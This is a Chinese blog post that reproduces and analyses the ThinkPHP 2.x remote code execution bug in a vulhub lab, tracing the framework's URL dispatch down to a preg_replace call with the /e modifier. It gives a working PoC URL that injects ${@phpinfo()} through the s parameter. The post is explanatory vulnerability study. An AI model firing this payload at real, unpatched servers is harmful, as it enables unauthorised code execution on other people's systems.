---
title: ThinkPHP 2.x RCE 漏洞复现与源码分析
date: 2026-01-24 10:00:00
author: Xendr1a
categories: [CVE复现]
tags: [ThinkPHP, RCE]
description: ThinkPHP 2.x RCE 的复现过程与源码分析。
toc: true
---
## 概述

### 前言

最近对漏洞的好奇又上来了，就开始在vulhub开始捣鼓了，网上搜大多都是直接复现完就完事了，我还是喜欢看着代码来复现，然后就从docker把源码拔下来看了

### 入口

Web 请求首先进入项目入口文件 index.php

```text
require(THINK_PATH."/ThinkPHP.php");
App::run();
```

我们跟进`App::run();`

```text
static public function run() {
        App::init();
        // 记录应用初始化时间
        if(C('SHOW_RUN_TIME')) G('initTime');
        App::exec();
        // 保存日志记录
        if(C('LOG_RECORD')) Log::save();
        return ;
    }
```

run()这里会继续调用init()和exec()，这里要注意一个关键点：

- App::init()：负责初始化和 URL 调度
- App::exec()：负责真正去执行控制器方法

虽然后续真正执行业务逻辑的是 exec()，但这次漏洞在 init() 的 URL 解析阶段就已经触发了。

### 漏洞触发点

在 `App::init() `中，会调用`Dispatcher::dispatch();`

```text
static public function init()
    {
        ...
        Dispatcher::dispatch();
        ...
    }
```

```text
static public function dispatch()
    {
        $urlMode  =  C('URL_MODEL');
        if($urlMode == URL_REWRITE ) {
            //当前项目地址
            $url    =   dirname(_PHP_FILE_);
            if($url == '/' || $url == '\\')
                $url    =   '';
            define('PHP_FILE',$url);
        }elseif($urlMode == URL_COMPAT){
            define('PHP_FILE',_PHP_FILE_.'?'.C('VAR_PATHINFO').'=');
        }else {
            //当前项目地址
            define('PHP_FILE',_PHP_FILE_);
        }

        // 开启子域名部署
        if(C('APP_SUB_DOMAIN_DEPLOY')) {
            $rules = C('APP_SUB_DOMAIN_RULES');
            $subDomain    = strtolower(substr($_SERVER['HTTP_HOST'],0,strpos($_SERVER['HTTP_HOST'],'.')));
            define('SUB_DOMAIN',$subDomain); // 二级域名定义
            if($subDomain && array_key_exists($subDomain,$rules)) {
                $rule =  $rules[$subDomain];
            }elseif(isset($rules['*'])){ // 泛域名支持
                if('www' != $subDomain && !in_array($subDomain,C('APP_SUB_DOMAIN_DENY'))) {
                    $rule =  $rules['*'];
                }
            }
            if(!empty($rule)) {
                // 子域名部署规则 '子域名'=>array('分组名/[模块名]','var1=a&var2=b');
                $array   =  explode('/',$rule[0]);
                $module = array_pop($array);
                if(!empty($module)) {
                    $_GET[C('VAR_MODULE')] = $module;
                    $domainModule   =  true;
                }
                if(!empty($array)) {
                    $_GET[C('VAR_GROUP')]  = array_pop($array);
                    $domainGroup =  true;
                }
                if(isset($rule[1])) { // 传入参数
                    parse_str($rule[1],$parms);
                    $_GET   =  array_merge($_GET,$parms);
                }
            }
        }
        $depr = C('URL_PATHINFO_DEPR');
        // 分析PATHINFO信息
        self::getPathInfo();

        if(!self::routerCheck()){   // 检测路由规则 如果没有则按默认规则调度URL
            $paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
            $var  =  array();
            if (C('APP_GROUP_LIST') && !isset($_GET[C('VAR_GROUP')])){
                $var[C('VAR_GROUP')] = in_array(strtolower($paths[0]),explode(',',strtolower(C('APP_GROUP_LIST'))))? array_shift($paths) : '';
                if(C('APP_GROUP_DENY') && in_array(strtolower($var[C('VAR_GROUP')]),explode(',',strtolower(C('APP_GROUP_DENY'))))) {
                    // 禁止直接访问分组
                    exit;
                }
            }
            if(!isset($_GET[C('VAR_MODULE')])) {// 还没有定义模块名称
                $var[C('VAR_MODULE')]  =   array_shift($paths);
            }
            $var[C('VAR_ACTION')]  =   array_shift($paths);
            // 解析剩余的URL参数
            $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
            $_GET   =  array_merge($var,$_GET);
        }
...
```

`dispatch() `的职责是解析 URL，有问题的代码在这

```text
 $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
            $_GET   =  array_merge($var,$_GET);
```

`/e `修饰符会让` preg_replace `的替换结果不再只是普通字符串，而是作为代码执行。

### Poc是怎么触发的

我们先看看Poc

```text
/index.php?s=/index/index/name/${@phpinfo()}
```

在\ThinkPHP\Common\convention.php里面`'VAR_PATHINFO'   => 's'`，也就是说s 参数会被当成 PATHINFO来处理。对应代码在 `Dispatcher::getPathInfo()：`

```text
public static function getPathInfo()
    {
        if(!empty($_GET[C('VAR_PATHINFO')])) {
            // 兼容PATHINFO 参数
            $path = $_GET[C('VAR_PATHINFO')];
            unset($_GET[C('VAR_PATHINFO')]);
        }elseif(!empty($_SERVER['PATH_INFO'])){
            $pathInfo = $_SERVER['PATH_INFO'];
            if(0 === strpos($pathInfo,$_SERVER['SCRIPT_NAME']))
                $path = substr($pathInfo, strlen($_SERVER['SCRIPT_NAME']));
            else
                $path = $pathInfo;
        }elseif(!empty($_SERVER['ORIG_PATH_INFO'])) {
            $pathInfo = $_SERVER['ORIG_PATH_INFO'];
            if(0 === strpos($pathInfo, $_SERVER['SCRIPT_NAME']))
                $path = substr($pathInfo, strlen($_SERVER['SCRIPT_NAME']));
            else
                $path = $pathInfo;
        }elseif (!empty($_SERVER['REDIRECT_PATH_INFO'])){
            $path = $_SERVER['REDIRECT_PATH_INFO'];
        }elseif(!empty($_SERVER["REDIRECT_Url"])){
            $path = $_SERVER["REDIRECT_Url"];
            if(empty($_SERVER['QUERY_STRING']) || $_SERVER['QUERY_STRING'] == $_SERVER["REDIRECT_QUERY_STRING"])
            {
                $parsedUrl = parse_url($_SERVER["REQUEST_URI"]);
                if(!empty($parsedUrl['query'])) {
                    $_SERVER['QUERY_STRING'] = $parsedUrl['query'];
                    parse_str($parsedUrl['query'], $GET);
                    $_GET = array_merge($_GET, $GET);
                    reset($_GET);
                }else {
                    unset($_SERVER['QUERY_STRING']);
                }
                reset($_SERVER);
            }
        }
        if(C('URL_HTML_SUFFIX') && !empty($path)) {
            $path = preg_replace('/\.'.trim(C('URL_HTML_SUFFIX'),'.').'$/', '', $path);
        }
        $_SERVER['PATH_INFO'] = empty($path) ? '/' : $path;
    }
```

所以

```text
/index.php?s=/index/index/name/${@phpinfo()}
```

会被先取出来，然后变成

```text
$_SERVER['PATH_INFO'] = '/index/index/name/${@phpinfo()}';
```

接下来 dispatch() 会对这段 PATHINFO 进行拆分：

```text
$paths = explode($depr,trim($_SERVER['PATH_INFO'],'/'));
```

这里 \$depr 的值是 /，所以结果就是：

```text
$paths = ['index', 'index', 'name', '${@phpinfo()}'];
```

随后框架会按顺序取前两段：

```text
$var[C('VAR_MODULE')]  = array_shift($paths);
$var[C('VAR_ACTION')]  = array_shift($paths);
```

第一个 index 会被当成模块名，第二个 index 会被当成操作名，框架后面会把模块名自动补成 IndexAction，最终去找 `IndexAction::index()`。

剩下的 `name/${@phpinfo()}` 则继续作为参数部分处理，其中 `name` 是参数名，`${@phpinfo()}` 是参数值。

```text
$res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
```

也就是说传入的数据就会变成这样子

```text
$var['name']="${@phpinfo()}";
```

关键点在于，这里使用了 /e 修饰符。/e 的作用不是普通替换，而是会把替换后的结果当成 PHP 代码执行。

而 `${@phpinfo()}` 又恰好落在双引号字符串中，会触发 PHP 的复杂变量解析，于是 phpinfo() 被执行，最终造成了远程代码执行。

整个过程其实可以概括成下面这样：

1. 请求进入 index.php
2. 调用 App::run()
3. App::init() 中进入 Dispatcher::dispatch()
4. s 参数被当成 PATHINFO
5. PATHINFO 被拆成模块、操作、参数名、参数值
6. 参数解析时调用了带 /e 的 preg_replace
7. 用户可控内容被拼进 PHP 代码里执行
8. phpinfo() 成功触发，RCE 成立

### 总结

ThinkPHP 2.x 这条 RCE 的核心问题，不在业务代码，而在框架底层的 URL 参数解析。  
框架本意只是想把 PATHINFO 中的剩余内容解析成普通参数，但由于 `preg_replace` 使用了 `/e` 修饰符，用户可控输入最终被拼接进可执行代码中，导致远程代码执行。

怎么说呢，看代码利用过程还是很爽的有一种闯关的感觉。
